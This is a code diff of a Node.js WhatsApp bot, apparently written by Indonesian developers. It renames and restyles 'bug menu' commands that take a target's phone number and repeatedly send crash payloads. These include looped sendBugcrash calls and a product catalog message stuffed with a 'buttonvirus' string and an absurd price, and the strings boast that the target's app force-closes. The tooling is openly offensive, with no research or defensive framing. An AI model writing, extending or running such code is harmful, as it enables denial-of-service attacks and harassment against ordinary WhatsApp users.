@@ -221,18 +221,27 @@ messageId: ""
 switch (command) {
 
 case 'menu':
-jiren = `
-=====•=================================== 
-====        == Bug Menu ==
-=====•=================================== 
-==== > ${prefix}turu1 (Akses Bot)
-=====•=================================== 
-==== > ${prefix}bugstc (AKSES OWNER)
-==== > ${prefix}buglog (AKSES OWNER)
-==== > ${prefix}bugtem (AKSES OWNER)
-=====•=================================== 
-==== CREATE BY NODEJS
-=====•=================================== `
+jiren = ` 
+亗╭┬─────────────────┈ 
+亗├ 「 𝗦𝗖 𝗩𝗜𝗣 𝗕𝗬 𝗞𝗨𝗥𝗥𝗫𝗗 」
+亗├┬─────────────────┈ 
+亗├ 𝙫𝙚𝙧𝙨𝙞𝙤𝙣 : 2.0.3
+亗├ 𝙡𝙞𝙗 : baileys
+亗├ 𝙨𝙘 : private
+亗├──────────────────┈
+亗├ 「𝘽𝙐𝙂 𝙈𝙀𝙉𝙐」
+亗├──────────────────┈
+亗├ • ${prefix}bug1
+亗├ • ${prefix}bug2
+亗├ • ${prefix}bug3
+亗├──────────────────┈
+亗├ 「𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 𝙑2」
+亗├ NOTE : wajib pakai wa web
+亗├──────────────────┈
+亗├ • ${prefix}bugvn
+亗├ • ${prefix}bugtext
+亗├─────────────────┈ 
+`
 diablobotwhatsapp.reply(jiren)
 break
 
@@ -479,7 +488,7 @@ let res = await styletext(q)
 diablobotwhatsapp.reply(util.format(res))
 }
 break
-case 'bugstc':{
+case 'bug3':{
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
@@ -492,20 +501,20 @@ await sleep(ms(waktu))
 diablobotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
 }
 break
-case 'bugtem': {
+case 'bug2': {
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 waktu = '5s'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(num, 'Hallo Kak', 'Aku KirBotz', 'Minta Donasi Nya Donk Kak', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(ms(waktu))
 }
 diablobotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
 }
 break
-case 'buglog': {
+case 'bug1': {
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
@@ -518,7 +527,7 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "7091718154232528",
-"title": `Tes Doank`,
+"title": `MAMPUS FC CHUAKS`,
 "description": `${buttonvirus}${buttonvirus}`,
 "currencyCode": "IDR",
 "priceAmount1000": "100000000000000000",
@@ -526,7 +535,7 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/6281220670449`
+"url": `https://wa.me/0`
 },
 "businessOwnerJid": "6281220670449@s.whatsapp.net",
 }
@@ -539,7 +548,7 @@ diablobotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Deng
 break
 
 
-case 'turu1':{
+case 'bugvn':{
 if (!botNumber) return diablobotwhatsapp.reply(mess.owner)
 jumlah = '3'
 waktu = '4s'
@@ -550,12 +559,12 @@ await sleep(ms(waktu))
 diablobotwhatsapp.reply(`Target Sudah Turu`)
 }
 break
-case 'bugteks':{
+case 'bugtext':{
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 jumlah = '25'
 waktu = '5s'
 for (let i = 0; i < jumlah; i++) {
-diablo.sendMessage(from, {text: "Hai Aku diablo"},{ quoted: lep })
+diablo.sendMessage(from, {text: "Ngetes Bang"},{ quoted: lep })
 await sleep(ms(waktu))
 }
 diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
